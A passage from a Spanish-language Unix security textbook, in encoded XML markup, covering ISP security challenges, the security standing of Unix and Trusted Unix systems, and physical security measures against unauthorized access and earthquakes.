reducir al m&#x02CA;&#x0131;nimo su n&#x00FA;mero. Si los ISPs viven justamente de permitir accesos &#x2013; a Internet o a sus propios
servidores &#x2013; parece obvio que no podr&#x00E1;n aplicar estrictas pol&#x02CA;&#x0131;ticas de seguridad en las m&#x00E1;quinas:
mientras que por ejemplo en una empresa el administrador puede obligar &#x2013; relativamente &#x2013; a sus
usuarios a utilizar protocolos cifrados, si un ISP no permite acceso ftp a los clientes que deseen
colgar sus p&#x00E1;ginas web y les obliga a usar un protocolo de transferencia de archivos que aplique
criptograf&#x02CA;&#x0131;a, es muy probable que muchos de esos clientes abandonen y se vayan a la competencia: es
m&#x00E1;s f&#x00E1;cil utilizar el ftp cl&#x00E1;sico que instalar software adicional para poder actualizar una p&#x00E1;gina
web.
<!--br/-->
<!--br/-->Imaginemos un proveedor que ofrece conexi&#x00F3;n a Internet a sus clientes; sin duda esos clientes querr&#x00E1;n
conectar a p&#x00E1;ginas web, hacer IRC, transferir archivos o utilizar telnet. Nada problem&#x00E1;tico a primera vista:
las conexiones se realizan hacia el exterior de nuestra red, no hacia el interior. Pero adem&#x00E1;s esos clientes
querr&#x00E1;n utilizar ICQ o NetMeeting, querr&#x00E1;n instalar servidores de todo tipo en sus m&#x00E1;quinas para que
sus amigos los utilicen &#x2013; desde servicios web hasta NFS &#x2013;, con lo que empiezan los primeros
problemas. Y no nos quedamos aqu&#x02CA;&#x0131;: seguramente quieren poder descargar su correo POP3 desde
cualquier lugar, no s&#x00F3;lo desde el rango de direcciones del proveedor (por supuesto, sin oir hablar
de cifrado en la conexi&#x00F3;n) y tambi&#x00E9;n les hace gracia un espacio para publicar sus p&#x00E1;ginas web
de forma permanente&#x2026;y mucho mejor para ellos si se les permite programar e instalar sus
propios CGIs en dichas p&#x00E1;ginas; aqu&#x02CA;&#x0131; ya no hay opci&#x00F3;n: o simplemente se les niega esta &#x00FA;ltima
posibilidad, o si se les permite y deseamos un entorno medianamente seguro hemos de dedicar
recursos &#x2013; y no pocos &#x2013; a veri&#xFB01;car la seguridad de esos programas. Hagamos lo que hagamos,
tenemos problemas: si no permitimos que los usuarios usen sus propios CGIs, y otro proveedor
s&#x02CA;&#x0131; que lo permite, seguramente cambiar&#x00E1;n de ISP&#x2026;si revisamos la seguridad, tampoco les va
a hacer gracia tener que modi&#xFB01;car su programa una y otra vez hasta que lo consideremos
seguro; a &#xFB01;n de cuentas, estar&#x00E1;n modi&#xFB01;c&#x00E1;ndolo para conseguir algo que probablemente ni siquiera
entiendan.
<!--br/-->
<!--br/-->Sigamos a~nadiendo problemas: puestos a pedir, los usuarios tambi&#x00E9;n pueden pedir acceso a bases de datos
en sus p&#x00E1;ginas, por ejemplo v&#x02CA;&#x0131;a PHP3; ya nos afectan los problemas que pueda tener este tipo de
software. Incluso pueden querer instalar sistemas completos de comercio electr&#x00F3;nico, sistemas
capaces de convertir nuestra red en un aut&#x00E9;ntico agujero. Es m&#x00E1;s, si permitimos hospedaje de
m&#x00E1;quinas es muy probable que el cliente que usa este servicio quiera acceder remotamente v&#x02CA;&#x0131;a

telnet &#x2013; o peor, rlogin&#x2013;, incluso para tareas de administraci&#x00F3;n; ni oir hablar de cosas como
SSH o SSL Telnet: a &#xFB01;n de cuentas, hacen lo mismo y son m&#x00E1;s complicados que un sencillo
telnet&#x2026;
<!--br/-->
<!--br/-->La seguridad de los ISPs sufre adem&#x00E1;s el problema cl&#x00E1;sico de la seguridad en cualquier entorno, pero quiz&#x00E1;s
de una forma mucho m&#x00E1;s grave: estamos trabajando con algo intangible, con algo muy dif&#x02CA;&#x0131;cil de ver. Si se
realiza una inversi&#x00F3;n de tiempo o dinero para adquirir equipos nuevos, la mejora se nota inmediatamente; si
esa inversi&#x00F3;n se realiza para incrementar la seguridad, quiz&#x00E1;s las mejoras obtenidas nunca las pueda notar un
usuario. Y si las nota, con toda probabilidad es peor: es porque han fallado. La mayor parte de los
potenciales clientes de un ISP preferir&#x00E1; una conexi&#x00F3;n un poco m&#x00E1;s r&#x00E1;pida frente a una conexi&#x00F3;n o unos servicios
m&#x00E1;s seguros.
<!--br/-->
<!--br/-->Con situaciones tan sencillas y comunes como las anteriores podemos hacernos una idea de la potencial
inseguridad de los ISPs; se trata de problemas reales, no meramente te&#x00F3;ricos: en ambientes underground no
es raro encontrar piratas con casi todas &#x2013; o con todas &#x2013; las claves de los clientes de un proveedor
(personalmente he conocido varios casos). S&#x00F3;lo tenemos un punto a nuestro favor, si se puede considerar as&#x02CA;&#x0131;:
hace un par de a~nos esas claves eran algo m&#x00E1;s o menos valioso para un pirata, ya que con ellas consegu&#x02CA;&#x0131;a un
acceso a Internet gratuito y &#x2013; m&#x00E1;s importante &#x2013; si dar ninguno de sus datos. Hoy en d&#x02CA;&#x0131;a, y debido a
empresas que ofrecen ese tipo de acceso &#x2013; por ejemplo como Alehop, con unas contrase~nas
gen&#x00E9;ricas y gratuitas para todo el mundo &#x2013;, las claves de los clientes de un ISP no son algo tan
codiciado.
  </para></section><!--end subsection--></section><!--end section--><!--l. 1040--><section 
role="section"><title><abbrev role="title-mark">1.8</abbrev><anchor 
   id="x1-190001.8"  ></anchor>&#x00BF;Seguridad en Unix?</title>
<!--l. 1041--><para>  En la d&#x00E9;cada de los ochenta para mucha gente el concepto de seguridad era algo inimaginable en el
entorno Unix: la facilidad con que un experto pod&#x02CA;&#x0131;a acceder a un sistema, burlar todos sus mecanismos de
protecci&#x00F3;n y conseguir el m&#x00E1;ximo nivel de privilegio era algo de sobra conocido por todos, por lo que nadie
pod&#x02CA;&#x0131;a pensar en un sistema Unix seguro.
<!--br/-->
<!--br/-->Afortunadamente, los tiempos han cambiado mucho desde entonces. Aunque en un principio y seg&#x00FA;n uno de
sus creadores, Unix no se dise~n&#x00F3; para ser seguro (<citation>[?]</citation>), a &#xFB01;nales de los 80 se convirti&#x00F3; en el primer sistema
operativo en alcanzar niveles de seguridad quasi militares (<citation>[?]</citation>, <citation>[?]</citation>&#x2026;). En la actualidad se puede considerar
el sistema operativo de prop&#x00F3;sito general m&#x00E1;s &#xFB01;able del mercado; desde los clones habituales (Solaris,
HP-UX, IRIX&#x2026;) hasta los &#x2018;Trusted Unix&#x2019; (de los que hablaremos a continuaci&#x00F3;n), pasando por los sistemas
gratuitos (Linux, FreeBSD&#x2026;), cualquier entorno Unix puede ofrecer los mecanismos de seguridad
su&#xFB01;cientes para satisfacer las necesidades de la mayor&#x02CA;&#x0131;a de instituciones. Los Unices habituales, como
Solaris o Linux, son bastante inseguros tal y como se instalan por defecto (out-of-the-box),
como veremos a la hora de hablar de la seguridad l&#x00F3;gica; esto signi&#xFB01;ca que requieren de una
m&#x02CA;&#x0131;nima puesta a punto, en cuanto a seguridad se re&#xFB01;ere, antes de ponerlos a trabajar con
unas m&#x02CA;&#x0131;nimas garant&#x02CA;&#x0131;as de &#xFB01;abilidad. Una vez realizada esta puesta a punto suelen tener una
seguridad aceptable en redes de prop&#x00F3;sito general. El problema es que en muchas ocasiones se
pone a trabajar a Unix tal y como se instala por defecto, lo que convierte a cualquier sistema
operativo, Unix o no, en un aut&#x00E9;ntico agujero en cuanto a seguridad se re&#xFB01;ere: cuentas sin
password o con passwords por defecto, servicios abiertos, sistemas de &#xFB01;cheros susceptibles de ser
compartidos&#x2026;
<!--br/-->
<!--br/-->Dentro de la familia Unix existen una serie de sistemas denominados &#x2018;Unix seguros&#x2019; o &#x2018;Unix &#xFB01;ables&#x2019;
(Trusted Unix); se trata de sistemas con excelentes sistemas de control, evaluados por la
National Security Agency (NSA) estadounidense y clasi&#xFB01;cados en niveles seguros (B o A) seg&#x00FA;n <citation>[?]</citation>.
Entre estos Unix seguros podemos encontrar AT&#x0026;T System V/MLS y OSF/1 (B1), Trusted
Xenix <anchor 
   id="x1-19001f8"  ></anchor><footnote><para>     Este sistema, de la compa~n&#x02CA;&#x0131;a Trusted Information Systems, Inc, obviamente no tiene nada que ver con el antiguo
Microsoft Xenix, de Microsoft Corporation</para></footnote>
(B2) y XTS-300 STOP 4.1 (B3), considerados los sistemas operativos m&#x00E1;s seguros del mundo (siempre seg&#x00FA;n
la NSA). La gran mayor&#x02CA;&#x0131;a de Unices (Solaris, AIX&#x2026;) est&#x00E1;n clasi&#xFB01;cados como C2, y algunos otros, como
Linux, se consideran sistemas C2 de facto: al no tener una empresa que pague el proceso de evaluaci&#x00F3;n de la
NSA no est&#x00E1;n catalogados, aunque puedan implementar todos los mecanismos de los sistemas
C2.

<!--br/-->
<!--br/-->A la vista de lo comentado en este punto, parece claro que Unix ha dejado de ser ese sistema
arcaico e inseguro de sus primeros tiempos para convertirse en el entorno de trabajo m&#x00E1;s &#xFB01;able
dentro de la gama de sistemas operativos de prop&#x00F3;sito general; sin embargo, por alguna extra~na
raz&#x00F3;n, mucha gente tiende a considerar todav&#x02CA;&#x0131;a a los equipos Unix como amenazas en la red,
especialmente a los clones gratuitos como Linux o FreeBSD que habitualmente se ejecutan
en PCs; el hecho de que sean gratuitos no implica en ning&#x00FA;n momento que sean inestables, y
mucho menos, inseguros: empresas tan importantes como Yahoo! (www.yahoo.com) o Citro&#x00A8;en
(www.citroen.com), o el propio servicio postal de Estados Unidos utilizan estos entornos como
servidores web o como &#xFB01;rewall en sus redes. No obstante, las pol&#x02CA;&#x0131;ticas de marketing de ciertas
empresas desarrolladoras tienden a popularizar (y lamentablemente lo consiguen) ideas err&#x00F3;neas
sobre la seguridad en Unix, lo que motiva que algunas organizaciones intenten buscar sistemas
alternativos, casi siempre sustituyendo m&#x00E1;quinas Unix por entornos Windows NT o Windows 9x. No
creo que haga falta hacer comentarios sobre la seguridad de estos sistemas, por lo que no
entraremos en detalles sobre ella; si alguien est&#x00E1; interesado, o duda de la capacidad de Unix frente
a estos entornos, puede consultar alguna de las comparativas o de los art&#x02CA;&#x0131;culos publicados
sobre el tema por universidades o por prestigiosos nombres dentro del mundo de la seguridad
inform&#x00E1;tica, o simplemente interesarse por el tipo de sistemas utilizados en centros de investigaci&#x00F3;n
como AT&#x0026;T y la NASA, o en organismos de seguridad como el FBI y la NSA: Unix, por
supuesto.


</para><!--l. 1--><para>

</para><!--l. 1--><para>

</para><!--l. 1--><para>

  </para></section><!--end section--><!--l. 1--><section 
role="part"><title><anchor 
   id="x1-20000I"  ></anchor>Seguridad del entorno de operaciones</title>

<!--l. 63--><para>


</para><!--l. 1--><para>

  </para></section><!--end part--></section><!--end chapter--><!--l. 1--><section 
role="chapter"><title><anchor 
   id="x1-210002"  ></anchor>Seguridad f&#x02CA;&#x0131;sica de los sistemas</title>
  <!--l. 2--><section 
role="section"><title><abbrev role="title-mark">2.1</abbrev><anchor 
   id="x1-220002.1"  ></anchor>Introducci&#x00F3;n</title>
<!--l. 3--><para>  Seg&#x00FA;n <citation>[?]</citation>, la seguridad f&#x02CA;&#x0131;sica de los sistemas inform&#x00E1;ticos consiste en la aplicaci&#x00F3;n de barreras
f&#x02CA;&#x0131;sicas y procedimientos de control como medidas de prevenci&#x00F3;n y contramedidas contra las
amenazas a los recursos y la informaci&#x00F3;n con&#xFB01;dencial. M&#x00E1;s claramente, y particularizando para
el caso de equipos Unix y sus centros de operaci&#x00F3;n, por &#x2018;seguridad f&#x02CA;&#x0131;sica&#x2019; podemos entender
todas aquellas mecanismos &#x2013; generalmente de prevenci&#x00F3;n y detecci&#x00F3;n &#x2013; destinados a proteger
f&#x02CA;&#x0131;sicamente cualquier recurso del sistema; estos recursos son desde un simple teclado hasta una cinta
de backup con toda la informaci&#x00F3;n que hay en el sistema, pasando por la propia CPU de la
m&#x00E1;quina.
<!--br/-->
<!--br/-->Desgraciadamente, la seguridad f&#x02CA;&#x0131;sica es un aspecto olvidado con demasiada frecuencia a la hora de hablar
de seguridad inform&#x00E1;tica en general; en muchas organizaciones se suelen tomar medidas para prevenir o
detectar accesos no autorizados o negaciones de servicio, pero rara vez para prevenir la acci&#x00F3;n de un
atacante que intenta acceder f&#x02CA;&#x0131;sicamente a la sala de operaciones o al lugar donde se depositan las
impresiones del sistema. Esto motiva que en determinadas situaciones un atacante se decline por
aprovechar vulnerabilidades f&#x02CA;&#x0131;sicas en lugar de l&#x00F3;gicas, ya que posiblemente le sea m&#x00E1;s f&#x00E1;cil robar
una cinta con una imagen completa del sistema que intentar acceder a &#x00E9;l mediante fallos en el
software. Hemos de ser conscientes de que la seguridad f&#x02CA;&#x0131;sica es demasiado importante como para
ignorarla: un ladr&#x00F3;n que roba un ordenador para venderlo, un incendio o un pirata que accede
sin problemas a la sala de operaciones nos pueden hacer mucho m&#x00E1;s da~no que un intruso que
intenta conectar remotamente con una m&#x00E1;quina no autorizada; no importa que utilicemos los m&#x00E1;s
avanzados medios de cifrado para conectar a nuestros servidores, ni que hayamos de&#xFB01;nido una
pol&#x02CA;&#x0131;tica de &#xFB01;rewalling muy restrictiva: si no tenemos en cuenta factores f&#x02CA;&#x0131;sicos, estos esfuerzos
para proteger nuestra informaci&#x00F3;n no van a servir de nada. Adem&#x00E1;s, en el caso de organismos
con requerimientos de seguridad medios, unas medidas de seguridad f&#x02CA;&#x0131;sicas ejercen un efecto
disuasorio sobre la mayor&#x02CA;&#x0131;a de piratas: como casi todos los atacantes de los equipos de estos
entornos son casuales (esto es, no tienen inter&#x00E9;s espec&#x02CA;&#x0131;&#xFB01;co sobre nuestros equipos, sino sobre
cualquier equipo), si notan a trav&#x00E9;s de medidas f&#x02CA;&#x0131;sicas que nuestra organizaci&#x00F3;n est&#x00E1; preocupada
por la seguridad probablemente abandonar&#x00E1;n el ataque para lanzarlo contra otra red menos
protegida.
<!--br/-->
<!--br/-->Aunque como ya dijimos en la introducci&#x00F3;n este proyecto no puede centrarse en el dise~no de edi&#xFB01;cios
resistentes a un terremoto o en la instalaci&#x00F3;n de alarmas electr&#x00F3;nicas, s&#x02CA;&#x0131; que se van a intentar comentar
ciertas medidas de prevenci&#x00F3;n y detecci&#x00F3;n que se han de tener en cuenta a la hora de de&#xFB01;nir mecanismos y
pol&#x02CA;&#x0131;ticas para la seguridad de nuestros equipos. Pero hemos de recordar que cada sitio es diferente, y por
tanto tambi&#x00E9;n lo son sus necesidades de seguridad; de esta forma, no se pueden dar recomendaciones
espec&#x02CA;&#x0131;&#xFB01;cas sino pautas generales a tener en cuenta, que pueden variar desde el simple sentido com&#x00FA;n (como
es el cerrar con llave la sala de operaciones cuando salimos de ella) hasta medidas mucho m&#x00E1;s
complejas, como la prevenci&#x00F3;n de radiaciones electromagn&#x00E9;ticas de los equipos o la utilizaci&#x00F3;n de
degaussers. En entornos habituales suele ser su&#xFB01;ciente con un poco de sentido com&#x00FA;n para
conseguir una m&#x02CA;&#x0131;nima seguridad f&#x02CA;&#x0131;sica; de cualquier forma, en cada instituci&#x00F3;n se ha de analizar
el valor de lo que se quiere proteger y la probabilidad de las amenazas potenciales, para en
funci&#x00F3;n de los resultados obtenidos dise~nar un plan de seguridad adecuado. Por ejemplo, en una
empresa ubicada en Valencia quiz&#x00E1;s parezca absurdo hablar de la prevenci&#x00F3;n ante terremotos (por
ser esta un &#x00E1;rea de bajo riesgo), pero no suceder&#x00E1; lo mismo en una universidad situada en una
zona s&#x02CA;&#x0131;smicamente activa; de la misma forma, en entornos de I+D es absurdo hablar de la
prevenci&#x00F3;n ante un ataque nuclear, pero en sistemas militares esta amenaza se ha de tener en
cuenta <anchor 
   id="x1-22001f1"  ></anchor><footnote><para>     Al menos en teor&#x02CA;&#x0131;a, ya que nadie sabe con certeza lo que sucede en organismos de defensa, excepto ellos
mismos.</para></footnote>.
  </para></section><!--end section--><!--l. 63--><section 
role="section"><title><abbrev role="title-mark">2.2</abbrev><anchor 
   id="x1-230002.2"  ></anchor>Protecci&#x00F3;n del hardware</title>
<!--l. 64--><para>  El hardware es frecuentemente el elemento m&#x00E1;s caro de todo sistema
inform&#x00E1;tico <anchor 
   id="x1-23001f2"  ></anchor><footnote><para>     Como dijimos, el m&#x00E1;s caro, pero no el m&#x00E1;s dif&#x02CA;&#x0131;cil de recuperar.</para></footnote>.

Por tanto, las medidas encaminadas a asegurar su integridad son una parte importante de la seguridad
f&#x02CA;&#x0131;sica de cualquier organizaci&#x00F3;n, especialmente en las dedicadas a I+D: universidades, centros de
investigaci&#x00F3;n, institutos tecnol&#x00F3;gicos&#x2026;suelen poseer entre sus equipos m&#x00E1;quinas muy caras, desde servidores
con una gran potencia de c&#x00E1;lculo hasta routers de &#x00FA;ltima tecnolog&#x02CA;&#x0131;a, pasando por modernos sistemas de
transmisi&#x00F3;n de datos como la &#xFB01;bra &#x00F3;ptica.
<!--br/-->
<!--br/-->Son muchas las amenazas al hardware de una instalaci&#x00F3;n inform&#x00E1;tica; aqu&#x02CA;&#x0131; se van a presentar algunas de
ellas, sus posibles efectos y algunas soluciones, si no para evitar los problemas s&#x02CA;&#x0131; al menos para minimizar
sus efectos.
  </para><!--l. 77--><section 
role="subsection"><title><abbrev role="title-mark">2.2.1</abbrev><anchor 
   id="x1-240002.2.1"  ></anchor>Acceso f&#x02CA;&#x0131;sico</title>
<!--l. 78--><para>  La posibilidad de acceder f&#x02CA;&#x0131;sicamente a una m&#x00E1;quina Unix &#x2013; en general, a cualquier sistema operativo &#x2013;
hace in&#x00FA;tiles casi todas las medidas de seguridad que hayamos aplicado sobre ella: hemos de pensar que si
un atacante puede llegar con total libertad hasta una estaci&#x00F3;n puede por ejemplo abrir la CPU y llevarse un
disco duro; sin necesidad de privilegios en el sistema, sin importar la robustez de nuestros cortafuegos, sin
nisiquiera una clave de usuario, el atacante podr&#x00E1; seguramente modi&#xFB01;car la informaci&#x00F3;n almacenada,
destruirla o simplemente leerla. Incluso sin llegar al extremo de desmontar la m&#x00E1;quina, que quiz&#x00E1;s resulte
algo exagerado en entornos cl&#x00E1;sicos donde hay cierta vigilancia, como un laboratorio o una sala de
inform&#x00E1;tica, la persona que accede al equipo puede pararlo o arrancar una versi&#x00F3;n diferente del sistema
operativo sin llamar mucho la atenci&#x00F3;n. Si por ejemplo alguien accede a un laboratorio con
m&#x00E1;quinas Linux, seguramente le resultar&#x00E1; f&#x00E1;cil utilizar un disco de arranque, montar los discos
duros de la m&#x00E1;quina y extraer de ellos la informaci&#x00F3;n deseada; incluso es posible que utilice un
ramdisk con ciertas utilidades que constituyan una amenaza para otros equipos, como nukes o
sni&#xFB00;ers.
<!--br/-->
<!--br/-->Visto esto, parece claro que cierta seguridad f&#x02CA;&#x0131;sica es necesaria para garantizar la seguridad global de la
red y los sistemas conectados a ella; evidentemente el nivel de seguridad f&#x02CA;&#x0131;sica depende completamente del
entorno donde se ubiquen los puntos a proteger (no es necesario hablar s&#x00F3;lo de equipos Unix, sino de
cualquier elemento f&#x02CA;&#x0131;sico que se pueda utilizar para amenazar la seguridad, como una toma de red
apartada en cualquier rinc&#x00F3;n de un edi&#xFB01;cio de nuestra organizaci&#x00F3;n). Mientras que parte de los equipos
estar&#x00E1;n bien protegidos, por ejemplo los servidores de un departamento o las m&#x00E1;quinas de los despachos,
otros muchos estar&#x00E1;n en lugares de acceso semip&#x00FA;blico, como laboratorios de pr&#x00E1;cticas; es justamente sobre
estos &#x00FA;ltimos sobre los que debemos extremar las precauciones, ya que lo m&#x00E1;s f&#x00E1;cil y discreto para un
atacante es acceder a uno de estos equipos y, en segundos, lanzar un ataque completo sobre la
red.
  </para><!--l. 109--><section 
role="subsubsection"><title><anchor 
   id="x1-250002.2.1"  ></anchor>Prevenci&#x00F3;n</title>
<!--l. 110--><para>  &#x00BF;C&#x00F3;mo prevenir un acceso f&#x02CA;&#x0131;sico no autorizado a un determinado punto? Hay soluciones para todos
los gustos, y tambi&#x00E9;n de todos los precios: desde analizadores de retina hasta videoc&#x00E1;maras,
pasando por tarjetas inteligentes o control de las llaves que abren determinada puerta. Todos los
modelos de autenticaci&#x00F3;n de usuarios (cap&#x02CA;&#x0131;tulo  <ulink 
  url="#x1-1090008"  ><!--ref: auth--></ulink>) son aplicables, aparte de para controlar el acceso
l&#x00F3;gico a los sistemas, para controlar el acceso f&#x02CA;&#x0131;sico; de todos ellos, quiz&#x00E1;s los m&#x00E1;s adecuados a la
seguridad f&#x02CA;&#x0131;sica sean los biom&#x00E9;tricos y los basados en algo pose&#x02CA;&#x0131;do; aunque como comentaremos
m&#x00E1;s tarde suelen resultar algo caros para utilizarlos masivamente en entornos de seguridad
media.
<!--br/-->
<!--br/-->Pero no hay que irse a sistemas tan complejos para prevenir accesos f&#x02CA;&#x0131;sicos no autorizados; normas tan
elementales como cerrar las puertas con llave al salir de un laboratorio o un despacho o bloquear las tomas
de red que no se suelan utilizar y que est&#x00E9;n situadas en lugares apartados son en ocasiones m&#x00E1;s que
su&#xFB01;cientes para prevenir ataques. Tambi&#x00E9;n basta el sentido com&#x00FA;n para darse cuenta de que el cableado de
red es un elemento importante para la seguridad, por lo que es recomendable apartarlo del acceso directo;
por desgracia, en muchas organizaciones podemos ver excelentes ejemplos de lo que no hay que hacer en
este sentido: cualquiera que pasee por entornos m&#x00E1;s o menos amplios (el campus de una universidad,
por ejemplo) seguramente podr&#x00E1; ver &#x2013; o pinchar, o cortar&#x2026;&#x2013; cables descolgados al alcance de

todo el mundo, especialmente durante el verano, &#x00E9;poca que se suele aprovechar para hacer
obras.
<!--br/-->
<!--br/-->Todos hemos visto pel&#x02CA;&#x0131;culas en las que se mostraba un estricto control de acceso a instalaciones militares
mediante tarjetas inteligentes, analizadores de retina o veri&#xFB01;cadores de la geometr&#x02CA;&#x0131;a de la mano; aunque
algunos de estos m&#x00E9;todos a&#x00FA;n suenen a ciencia &#xFB01;cci&#x00F3;n y sean demasiado caros para la mayor parte de entornos
(recordemos que si el sistema de protecci&#x00F3;n es m&#x00E1;s caro que lo que se quiere proteger tenemos un
grave error en nuestros planes de seguridad), otros se pueden aplicar, y se aplican, en muchas
organizaciones. Concretamente, el uso de lectores de tarjetas para poder acceder a ciertas
dependencias es algo muy a la orden del d&#x02CA;&#x0131;a; la idea es sencilla: alguien pasa una tarjeta por el lector,
que conecta con un sistema &#x2013; por ejemplo un ordenador &#x2013; en el que existe una base de datos
con informaci&#x00F3;n de los usuarios y los recintos a los que se le permite el acceso. Si la tarjeta
pertenece a un usuario capacitado para abrir la puerta, &#x00E9;sta se abre, y en caso contrario se registra
el intento y se niega el acceso. Aunque este m&#x00E9;todo quiz&#x00E1;s resulte algo caro para extenderlo
a todos y cada uno de los puntos a proteger en una organizaci&#x00F3;n, no ser&#x02CA;&#x0131;a tan descabellado
instalar peque~nos lectores de c&#x00F3;digos de barras conectados a una m&#x00E1;quina Linux en las puertas de
muchas &#x00E1;reas, especialmente en las que se maneja informaci&#x00F3;n m&#x00E1;s o menos sensible. Estos lectores
podr&#x02CA;&#x0131;an leer una tarjeta que todos los miembros de la organizaci&#x00F3;n poseer&#x02CA;&#x0131;an, conectar con
la base de datos de usuarios, y autorizar o denegar la apertura de la puerta. Se tratar&#x02CA;&#x0131;a de
un sistema sencillo de implementar, no muy caro, y que cubre de sobra las necesidades de
seguridad en la mayor&#x02CA;&#x0131;a de entornos: incluso se podr&#x02CA;&#x0131;a abaratar si en lugar de utilizar un
mecanismo para abrir y cerrar puertas el sistema se limitara a informar al administrador del &#x00E1;rea o
a un guardia de seguridad mediante un mensaje en pantalla o una luz encendida: de esta
forma los &#x00FA;nicos gastos ser&#x02CA;&#x0131;an los correspondientes a los lectores de c&#x00F3;digos de barras, ya que
como equipo con la base de datos se puede utilizar una m&#x00E1;quina vieja o un servidor de prop&#x00F3;sito
general.
  </para></section><!--end subsubsection--><!--l. 164--><section 
role="subsubsection"><title><anchor 
   id="x1-260002.2.1"  ></anchor>Detecci&#x00F3;n</title>
<!--l. 165--><para>  Cuando la prevenci&#x00F3;n es dif&#x02CA;&#x0131;cil por cualquier motivo (t&#x00E9;cnico, econ&#x00F3;mico, humano&#x2026;) es deseable que un
potencial ataque sea detectado cuanto antes, para minimizar as&#x02CA;&#x0131; sus efectos. Aunque en la detecci&#x00F3;n
de problemas, generalmente accesos f&#x02CA;&#x0131;sicos no autorizados, intervienen medios t&#x00E9;cnicos, como
c&#x00E1;maras de vigilancia de circuito cerrado o alarmas, en entornos m&#x00E1;s normales el esfuerzo en
detectar estas amenazas se ha de centrar en las personas que utilizan los sistemas y en las
que sin utilizarlos est&#x00E1;n relacionadas de cierta forma con ellos; sucede lo mismo que con la
seguridad l&#x00F3;gica: se ha de ver toda la protecci&#x00F3;n como una cadena que falla si falla su eslab&#x00F3;n m&#x00E1;s
d&#x00E9;bil.
<!--br/-->
<!--br/-->Es importante concienciar a todos de su papel en la pol&#x02CA;&#x0131;tica de seguridad del entorno; si por ejemplo un
usuario autorizado detecta presencia de alguien de quien sospecha que no tiene autorizaci&#x00F3;n
para estar en una determinada estancia debe avisar inmediatamente al administrador o al
responsable de los equipos, que a su vez puede avisar al servicio de seguridad si es necesario.
No obstante, utilizar este servicio debe ser s&#x00F3;lamente un &#x00FA;ltimo recurso: generalmente en la
mayor&#x02CA;&#x0131;a de entornos no estamos tratando con terroristas, sino por fortuna con elementos mucho
menos peligrosos. Si cada vez que se sospecha de alguien se avisa al servicio de seguridad
esto puede repercutir en el ambiente de trabajo de los usuarios autorizados estableciendo
cierta presi&#x00F3;n que no es en absoluto recomendable; un simple &#x2018;&#x00BF;puedo ayudarte en algo?&#x2019; suele
ser m&#x00E1;s efectivo que un guardia solicitando una identi&#xFB01;caci&#x00F3;n formal. Esto es especialmente
recomendable en lugares de acceso restringido, como laboratorios de investigaci&#x00F3;n o centros de c&#x00E1;lculo,
donde los usuarios habituales suelen conocerse entre ellos y es f&#x00E1;cil detectar personas ajenas al
entorno.
  </para></section><!--end subsubsection--></section><!--end subsection--><!--l. 192--><section 
role="subsection"><title><abbrev role="title-mark">2.2.2</abbrev><anchor 
   id="x1-270002.2.2"  ></anchor>Desastres naturales</title>
<!--l. 193--><para>  En el anterior punto hemos hecho referencia a accesos f&#x02CA;&#x0131;sicos no autorizados a zonas o a elementos que
pueden comprometer la seguridad de los equipos o de toda la red; sin embargo, no son estas las &#x00FA;nicas

amenazas relacionadas con la seguridad f&#x02CA;&#x0131;sica. Un problema que no suele ser tan habitual, pero que en
caso de producirse puede acarrear grav&#x02CA;&#x0131;simas consecuencias, es el derivado de los desastres naturales y su
(falta de) prevenci&#x00F3;n.
  </para><!--l. 200--><section 
role="subsubsection"><title><anchor 
   id="x1-280002.2.2"  ></anchor>Terremotos</title>
<!--l. 201--><para>  Los terremotos son el desastre natural menos probable en la mayor&#x02CA;&#x0131;a de organismos ubicados en Espa~na,
simplemente por su localizaci&#x00F3;n geogr&#x00E1;&#xFB01;ca: no nos encontramos en una zona donde se suelan producir
temblores de intensidad considerable; incluso en zonas del sur de Espa~na, como Almer&#x02CA;&#x0131;a, donde la
probabilidad de un temblor es m&#x00E1;s elevada, los terremotos no suelen alcanzan la magnitud necesaria para
causar da~nos en los equipos. Por tanto, no se suelen tomar medidas serias contra los movimientos s&#x02CA;&#x0131;smicos,
ya que la probabilidad de que sucedan es tan baja que no merece la pena invertir dinero para minimizar
sus efectos.
<!--br/-->
<!--br/-->De cualquier forma, aunque algunas medidas contra terremotos son excesivamente caras para la mayor
parte de organizaciones en Espa~na (evidentemente ser&#x02CA;&#x0131;an igual de caras en zonas como Los &#x00C1;ngeles, pero
all&#x02CA;&#x0131; el coste estar&#x02CA;&#x0131;a justi&#xFB01;cado por la alta probabilidad de que se produzcan movimientos de magnitud
considerable), no cuesta nada tomar ciertas medidas de prevenci&#x00F3;n; por ejemplo, es muy recomendable no
situar nunca equipos delicados en super&#xFB01;cies muy elevadas (aunque tampoco es bueno situarlos a ras de
suelo, como veremos al hablar de inundaciones). Si lo hacemos, un peque~no temblor puede tirar desde una
altura considerable un complejo hardware, lo que con toda probabilidad lo inutilizar&#x00E1;; puede incluso ser
conveniente (y barato) utilizar &#xFB01;jaciones para los elementos m&#x00E1;s cr&#x02CA;&#x0131;ticos, como las CPUs, los
monitores o los routers. De la misma forma, tampoco es recomendable situar objetos pesados en
super&#xFB01;cies altas cercanas a los equipos, ya que si lo que cae son esos objetos tambi&#x00E9;n da~nar&#x00E1;n el
hardware.
<!--br/-->
<!--br/-->Para evitar males mayores ante un terremoto, tambi&#x00E9;n es muy importante no situar equipos cerca de las
ventanas: si se produce un temblor pueden caer por ellas, y en ese caso la p&#x00E9;rdida de datos o hardware
pierde importancia frente a los posibles accidentes &#x2013; incluso mortales &#x2013; que puede causar una pieza
voluminosa a las personas a las que les cae encima. Adem&#x00E1;s, situando los equipos alejados de las
ventanas estamos di&#xFB01;cultando las acciones de un potencial ladr&#x00F3;n que se descuelgue por la fachada
hasta las ventanas, ya que si el equipo estuviera cerca no tendr&#x02CA;&#x0131;a m&#x00E1;s que alargar el brazo para
llev&#x00E1;rselo.
<!--br/-->
<!--br/-->Quiz&#x00E1;s hablar de terremotos en un trabajo dedicado a sistemas &#x2018;normales&#x2019; especialmente centr&#x00E1;ndonos en
lugares con escasa actividad s&#x02CA;&#x0131;smica &#x2013; como es Espa~na y m&#x00E1;s concretamente la Comunidad
Valenciana &#x2013; pueda resultar incluso gracioso, o cuanto menos exagerado. No obstante, no debemos
entender por terremotos &#x00FA;nicamente a los grandes desastres que derrumban edi&#xFB01;cios y destrozan
v&#x02CA;&#x0131;as de comunicaci&#x00F3;n; quiz&#x00E1;s ser&#x02CA;&#x0131;a mas apropiado hablar incluso de vibraciones, desde las m&#x00E1;s
grandes (los terremotos) hasta las m&#x00E1;s peque~nas (un simple motor cercano a los equipos). Las
vibraciones, incluso las m&#x00E1;s imperceptibles, pueden da~nar seriamente cualquier elemento electr&#x00F3;nico de
